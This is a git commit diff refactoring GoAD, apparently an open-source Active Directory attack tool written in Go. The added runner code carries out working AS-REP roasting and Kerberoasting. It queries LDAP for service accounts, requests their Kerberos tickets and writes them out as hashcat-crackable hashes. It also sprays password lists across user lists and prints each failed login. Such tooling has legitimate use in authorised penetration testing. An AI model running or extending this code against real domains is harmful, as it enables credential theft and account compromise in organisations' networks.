e52a621d9a6d4b701a2119f16e8e7adbd7da086f
5amu <casalinovalerio.cv@gmail.com>
2023-12-06 01:26:41 +0100

    refactor

--- cmd/goad/main.go
+++ cmd/goad/main.go
@@ -4,151 +4,33 @@ import (
 	"fmt"
 	"os"
 
-	"github.com/5amu/goad/pkg/attacks"
-	"github.com/projectdiscovery/goflags"
+	"github.com/5amu/goad/internal/runner"
+	"github.com/jessevdk/go-flags"
 )
 
-type options struct {
-	mode       string
-	username   string
-	password   string
-	domain     string
-	controller string
-	port       int
-	ssl        bool
-	useTls     bool
-	// Ldap stuff
-	// hashes
-	asreproast string
-	kerberoast string
-	// Ldap stuff
-	// bloodhound
-	bloodhound string
-	nameserver string
-	collection goflags.StringSlice
-	// Ldap stuff
-	// information
-	trustedForDelegation bool
-	passwordNotRequired  bool
-	adminCount           bool
-	userEnumeration      bool
-	groupsEnumeration    bool
-	dcList               bool
-	domainSID            bool
-	// Ldap stuff
-	// gmsa
-	gmsa           bool
-	gmsaConvertId  string
-	gmsaDecryptLsa string
-}
-
-func cliparse(opts *options) error {
-	flagSet := goflags.NewFlagSet()
-	flagSet.SetDescription(`GoAD - A totally different tool from crackmapexec by byt3bl33d3r. 
-Be kind, I'm learning the minutia in AD using Go. by @5amu.`)
-
-	flagSet.CreateGroup("connection", "Connection Options",
-		flagSet.StringVarP(&opts.username, "user", "u", "", "provide username"),
-		flagSet.StringVarP(&opts.password, "pass", "p", "", "provide password"),
-		flagSet.StringVarP(&opts.domain, "domain", "d", "WORKGROUP", "provide domain"),
-		flagSet.StringVarP(&opts.controller, "controller", "dc", "", "provide domain controller IP/FQDN"),
-	)
-
-	flagSet.CreateGroup("mode", "Select Mode",
-		flagSet.StringVar(&opts.mode, "mode", "", "select execution mode: [ldap]"),
-	)
-
-	flagSet.CreateGroup("ldapopts", "LDAP: Specific Connection Options",
-		flagSet.IntVarP(&opts.port, "port", "P", 389, "ldap port to contact"),
-		flagSet.BoolVarP(&opts.ssl, "ssl", "s", false, "use ssl to interact with ldap"),
-		flagSet.BoolVarP(&opts.useTls, "usetls", "tls", true, "should ldap upgrade the ldap connection"),
-	)
-
-	flagSet.CreateGroup("hashes", "LDAP: Retrieve Hashes",
-		flagSet.StringVarP(&opts.asreproast, "asreproast", "asrep", "", "grab AS_REP ticket(s) parsed to be cracked with hashcat"),
-		flagSet.StringVarP(&opts.kerberoast, "kerberoast", "krbst", "", "grab TGS ticket(s) parsed to be cracked with hashcat"),
-	)
-
-	flagSet.CreateGroup("enumeration", "LDAP: Enumerate Domain Information",
-		flagSet.BoolVar(&opts.trustedForDelegation, "trusted-for-delegation", false, "Get the list of users and computers with flag TRUSTED_FOR_DELEGATION"),
-		flagSet.BoolVar(&opts.passwordNotRequired, "password-not-required", false, "Get the list of users with flag PASSWD_NOTREQD"),
-		flagSet.BoolVar(&opts.adminCount, "admin-count", false, "Get objets that had the value adminCount=1"),
-		flagSet.BoolVar(&opts.userEnumeration, "users", false, "Enumerate enabled domain users"),
-		flagSet.BoolVar(&opts.groupsEnumeration, "groups", false, "Enumerate domain groups"),
-		flagSet.BoolVar(&opts.dcList, "dc-list", false, "Enumerate Domain Controllers"),
-		flagSet.BoolVar(&opts.domainSID, "get-sid", false, "Get domain sid"),
-	)
-
-	flagSet.CreateGroup("gmsa", "LDAP: Play with GMSA",
-		flagSet.BoolVar(&opts.gmsa, "gmsa", false, "Enumerate domain groups"),
-		flagSet.StringVar(&opts.gmsaConvertId, "gmsa-convert-id", "", "Get the secret name of specific gmsa or all gmsa if no gmsa provided"),
-		flagSet.StringVar(&opts.gmsaDecryptLsa, "gmsa-decrypt-lsa", "", "Decrypt the gmsa encrypted value from LSA"),
-	)
-
-	flagSet.CreateGroup("bloodhound", "LDAP: Run Bloodhound Collector v4.2",
-		flagSet.StringVarP(&opts.bloodhound, "bloodhound", "bh", "", "run bloodhound collector and save in output file"),
-		flagSet.StringVarP(&opts.nameserver, "nameserver", "ns", "", "provide a nameserver for bloodhound collector"),
-		flagSet.StringSliceVarP(&opts.collection, "collection", "c", goflags.StringSlice{"group", "localadmin", "session", "trust"}, "grab TGS ticket(s) parsed to be cracked with hashcat", goflags.CommaSeparatedStringSliceOptions),
-	)
-
-	return flagSet.Parse()
-}
-
-func (o *options) ldapR() error {
-	if o.asreproast != "" {
-		asreps, err := attacks.AsRepRoast(&attacks.AsRepRoastOpts{
-			Users:            []string{o.username},
-			Realm:            o.domain,
-			DomainController: o.controller,
-		})
-		if err != nil {
-			return err
-		}
-
-		for _, a := range asreps {
-			fmt.Printf("[+] ASREP-Roastable user %s\\%s... happy cracking!\n\n%s\n\n", o.domain, a.User, a.Hash)
-		}
-		return nil
-	}
-
-	if o.kerberoast != "" {
-		results, err := attacks.Kerberoast(&attacks.KerberoastOpts{
-			User:             o.username,
-			Realm:            o.domain,
-			Password:         o.password,
-			DomainController: o.controller,
-			LdapPort:         o.port,
-			LdapSSL:          o.ssl,
-			LdapSkipTLS:      !o.useTls,
-		})
-		if err != nil {
-			return err
-		}
-		for _, entry := range results {
-			fmt.Printf("[+] kerberoasted user %s\\%s for SPN %s... happy cracking!\n\n%s\n\n", o.domain, o.username, entry.ServicePrincipalName, entry.Hash)
-		}
-	}
-	return nil
+type MainOptions struct {
+	LDAP bool `long:"ldap" command:"ldap" description:"own stuff using LDAP"`
+	SMB  bool `long:"smb" command:"smb" description:"own stuff using SMB"`
 }
 
 func main() {
-	var opts options
+	p := flags.NewNamedParser("GoAD", flags.Default)
+	var mainOpts MainOptions
+	p.AddGroup("Application Options", "", &mainOpts)
 
-	if err := cliparse(&opts); err != nil {
-		fmt.Println(err)
+	if len(os.Args) < 2 {
+		p.WriteHelp(os.Stdout)
 		os.Exit(1)
 	}
 
-	var err error
-	switch opts.mode {
-	case "ldap":
-		err = opts.ldapR()
-	default:
-		err = fmt.Errorf("not a valid mode: %s", opts.mode)
+	if _, err := p.ParseArgs(os.Args[0:2]); err != nil {
+		os.Exit(1)
 	}
 
-	if err != nil {
-		fmt.Println(err)
-		os.Exit(1)
+	if mainOpts.LDAP {
+		if err := runner.ExecuteLdapSubcommand(os.Args[2:]); err != nil {
+			fmt.Println(err)
+			os.Exit(1)
+		}
 	}
 }
---
+++ internal/runner/ldap.go
@@ -0,0 +1,220 @@
+package runner
+
+import (
+	"fmt"
+	"strings"
+	"sync"
+
+	"github.com/5amu/goad/pkg/kerberos"
+	"github.com/5amu/goad/pkg/ldap"
+	"github.com/5amu/goad/pkg/utils"
+	"github.com/jessevdk/go-flags"
+)
+
+const (
+	ldapKerberoastableFilter = "(&(objectCategory=person)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(servicePrincipalName=*))"
+)
+
+type LdapConnectionOptions struct {
+	Targets struct {
+		TARGETS []string
+	} `positional-args:"yes" description:"Provide target IP/FQDN/FILE"`
+	targets   []string
+	Username  string `short:"u" description:"Provide username (or FILE)"`
+	usernames []string
+	Password  string `short:"p" description:"Provide password (or FILE)"`
+	passwords []string
+	Domain    string `short:"d" long:"domain" description:"Provide domain"`
+	Port      int    `long:"port" default:"389" description:"Ldap port to contact"`
+	SSL       bool   `short:"s" long:"ssl" description:"Use ssl to interact with ldap"`
+	UseTLS    bool   `long:"tls" description:"Upgrade the ldap connection"`
+}
+
+type LdapHashOptions struct {
+	AsrepRoast string `long:"asreproast" description:"Grab AS_REP ticket(s) parsed to be cracked with hashcat"`
+	Kerberoast string `long:"kerberoast" description:"Grab TGS ticket(s) parsed to be cracked with hashcat"`
+}
+
+type LdapEnumerationOptions struct {
+	TrustedForDelegation bool `long:"trusted-for-delegation" description:"Get the list of users and computers with flag TRUSTED_FOR_DELEGATION"`
+	PasswordNotRequired  bool `long:"password-not-required" description:"Get the list of users with flag PASSWD_NOTREQD"`
+	PasswordNeverExpires bool `long:"password-never-expires" description:"Get the list of accounts having a never expiring password"`
+	AdminCount           bool `long:"admin-count" description:"Get objets that had the value adminCount=1"`
+	UsersEnum            bool `long:"users" description:"Enumerate enabled domain users"`
+	GroupsEnum           bool `long:"groups" description:"Enumerate domain groups"`
+	DCList               bool `long:"dc-list" description:"Enumerate Domain Controllers"`
+	GetSID               bool `long:"get-sid" description:"Get domain sid"`
+}
+
+type LdapGMSAOptions struct {
+	GMSA           bool   `long:"gmsa" description:"Enumerate GMSA passwords"`
+	GMSAConvertID  string `long:"gmsa-convert-id" description:"Get the secret name of specific gmsa or all gmsa if no gmsa provided"`
+	GMSADecryptLSA string `long:"gmsa-decrypt-lsa" description:"Decrypt the gmsa encrypted value from LSA"`
+}
+
+type LdapBloodhoundOptions struct {
+	Bloodhound           string   `long:"bloodhound" description:"Run bloodhound collector (v4.2) and save in output file (zip)"`
+	BloodhoundNameserver string   `short:"n" long:"nameserver" description:"Provide a nameserver for bloodhound collector"`
+	Collection           []string `short:"c" long:"collection" default:"Default" description:"Which information to collect. Supported: Group, LocalAdmin, Session, Trusts, Default, DCOnly, DCOM, RDP, PSRemote, LoggedOn, Container, ObjectProps, ACL, All"`
+}
+
+type LdapOptions struct {
+	Connection  LdapConnectionOptions
+	Hash        LdapHashOptions
+	Enumeration LdapEnumerationOptions
+	GMSA        LdapGMSAOptions
+	Bloodhound  LdapBloodhoundOptions
+}
+
+func ExecuteLdapSubcommand(args []string) (err error) {
+	l := flags.NewNamedParser("GoAD ldap", flags.Default)
+
+	var ldapConnection LdapConnectionOptions
+	l.AddGroup("Connection Options", "", &ldapConnection)
+
+	var ldapHashes LdapHashOptions
+	l.AddGroup("Hash Retrieval Options", "", &ldapHashes)
+
+	var ldapEnumeration LdapEnumerationOptions
+	l.AddGroup("Enumeration Options", "", &ldapEnumeration)
+
+	var ldapGmsa LdapGMSAOptions
+	l.AddGroup("Play with GMSA", "", &ldapGmsa)
+
+	var ldapBloodhound LdapBloodhoundOptions
+	l.AddGroup("Run Bloodhound Collector v4.2", "", &ldapBloodhound)
+
+	if len(args) == 0 {
+		return nil
+	}
+
+	if _, err := l.ParseArgs(args); err != nil {
+		return nil
+	}
+
+	ldap := LdapOptions{
+		Connection:  ldapConnection,
+		Hash:        ldapHashes,
+		Enumeration: ldapEnumeration,
+		GMSA:        ldapGmsa,
+		Bloodhound:  ldapBloodhound,
+	}
+
+	ldap.Connection.usernames, err = utils.ReadLines(ldap.Connection.Username)
+	if err != nil {
+		ldap.Connection.usernames = []string{ldap.Connection.Username}
+	}
+	ldap.Connection.passwords, err = utils.ReadLines(ldap.Connection.Password)
+	if err != nil {
+		ldap.Connection.passwords = []string{ldap.Connection.Password}
+	}
+	for _, t := range ldap.Connection.Targets.TARGETS {
+		lines, err := utils.ReadLines(t)
+		if err != nil {
+			ldap.Connection.targets = append(ldap.Connection.targets, t)
+		} else {
+			ldap.Connection.targets = append(ldap.Connection.targets, lines...)
+		}
+	}
+	return ldap.run()
+}
+
+func (o *LdapOptions) run() error {
+	var f func(string) error
+
+	if o.Hash.AsrepRoast != "" {
+		f = o.asreproast
+	} else if o.Hash.Kerberoast != "" {
+		f = o.kerberoast
+	} else {
+		return fmt.Errorf("nothing to do")
+	}
+
+	var wg sync.WaitGroup
+	for _, target := range o.Connection.targets {
+		wg.Add(1)
+		go func(t string) {
+			if err := f(t); err != nil {
+				fmt.Println(err)
+			}
+			wg.Done()
+		}(target)
+	}
+	wg.Wait()
+	return nil
+}
+
+func (o *LdapOptions) asreproast(target string) error {
+	var res []string
+	for _, user := range o.Connection.usernames {
+		client, err := kerberos.NewKerberosClient(o.Connection.Domain, target)
+		if err != nil {
+			return err
+		}
+		asrep, err := client.GetAsReqTgt(user)
+		if err == nil {
+			hash := utils.ASREPToHashcat(*asrep.Ticket)
+			fmt.Printf("[+] ASREP-Roastable user %s\\%s... happy cracking!\n\n%s\n\n", o.Connection.Domain, user, hash)
+			res = append(res, hash)
+		}
+	}
+
+	if len(res) == 0 {
+		return fmt.Errorf("[%s] no asrep-roastable user found on target", target)
+	}
+	return utils.WriteLines(res, o.Hash.AsrepRoast)
+}
+
+func (o *LdapOptions) kerberoast(target string) error {
+	basedn := fmt.Sprintf("dc=%s", strings.Join(strings.Split(o.Connection.Domain, "."), ",dc="))
+	ldapClient := &ldap.LdapClient{
+		Host:    target,
+		Realm:   o.Connection.Domain,
+		Port:    o.Connection.Port,
+		BaseDN:  basedn,
+		SkipTLS: !o.Connection.UseTLS,
+		UseSSL:  o.Connection.SSL,
+	}
+
+	var res []string
+	for _, user := range o.Connection.usernames {
+		for _, password := range o.Connection.passwords {
+			if err := ldapClient.Authenticate(user, password); err != nil {
+				fmt.Printf("[%s\\%s:%s] %v\n", o.Connection.Domain, user, password, err)
+				continue
+			}
+
+			users, err := ldapClient.Search(ldapKerberoastableFilter, []string{"sAMAccountName", "servicePrincipalName"})
+			if err != nil {
+				fmt.Println(err)
+				continue
+			}
+			ldapClient.Close()
+
+			krb, err := kerberos.NewKerberosClient(o.Connection.Domain, target)
+			if err != nil {
+				fmt.Println(err)
+				continue
+			}
+			krb.AuthenticateWithPassword(user, password)
+
+			for _, entry := range users.Entries {
+				usr := entry.GetAttributeValue("sAMAccountName")
+				spn := entry.GetAttributeValue("servicePrincipalName")
+				tgs, err := krb.GetServiceTicket(usr, spn)
+				if err != nil {
+					fmt.Println(err)
+					continue
+				}
+				hash := utils.TGSToHashcat(tgs.Ticket, usr)
+				res = append(res, hash)
+				fmt.Printf("[+] kerberoasted user %s\\%s for SPN %s... happy cracking!\n\n%s\n\n", o.Connection.Domain, user, spn, hash)
+			}
+		}
+	}
+
+	if len(res) == 0 {
+		return fmt.Errorf("[%s] no kerberoastable user found on target", target)
+	}
+	return utils.WriteLines(res, o.Hash.Kerberoast)
+}
